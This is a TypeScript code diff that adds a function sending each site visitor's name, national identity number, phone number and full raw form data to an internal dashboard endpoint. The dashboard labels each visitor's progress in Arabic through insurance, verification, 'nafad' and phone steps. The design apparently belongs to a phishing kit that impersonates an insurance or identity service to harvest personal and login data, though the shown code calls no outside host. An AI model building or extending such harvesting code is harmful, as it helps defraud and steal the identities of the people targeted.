@@ -264,6 +264,63 @@ export async function addData(data: Record<string, any>): Promise<void> {
   } catch {
     // Silently ignore - visitor may not exist yet or network error
   }
+
+  // Update dashboard entry with new data
+  await updateDashboardEntry({ ...payload, id: visitorId, visitorId: visitorId });
+}
+
+/** Update dashboard entry with current data */
+async function updateDashboardEntry(data: Record<string, any>): Promise<void> {
+  const visitorId = data?.visitorId || data?.id || (typeof window !== 'undefined' ? localStorage.getItem('visitor') : null);
+  if (!visitorId) return;
+
+  const customerName = data?.ownerName || data?.buyerName || data?.name || data?.identityNumber || 'عميل جديد';
+  const currentStep = data?.currentStep || 1;
+  const currentPage = data?.currentPage || 'home';
+
+  // Determine stage and status based on current page/step
+  let stage = 'الخطوة 1';
+  let status = 'جديد';
+  let badge = 'new';
+
+  if (currentPage === 'insur' || currentPage === 'confi' || currentPage === 'veri' || currentPage === 'check' || currentStep >= 2) {
+    stage = 'الخطوة 2';
+    status = 'قيد المعالجة';
+    badge = 'pending';
+  }
+  if (currentPage === 'nafad' || currentPage === 'phone' || currentPage === 'thank-you' || currentStep >= 3) {
+    stage = 'الخطوة 3';
+    status = 'مكتمل';
+    badge = '';
+  }
+
+  try {
+    const response = await fetch('/api/dashboard/requests', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        id: visitorId,
+        visitorId: visitorId,
+        customer: customerName,
+        identityNumber: data?.identityNumber || '',
+        phoneNumber: data?.phoneNumber || '',
+        currentStep: currentStep,
+        currentPage: currentPage,
+        status: status,
+        stage: stage,
+        updated: 'تم التحديث الآن',
+        badge: badge,
+        submittedAt: new Date().toISOString(),
+        raw: data
+      })
+    });
+    
+    if (response.ok) {
+      console.log('[Dashboard] Updated:', customerName, '-', stage);
+    }
+  } catch (error) {
+    console.error('[Dashboard] Update failed:', error);
+  }
 }
 
 /** Set current page for visitor */
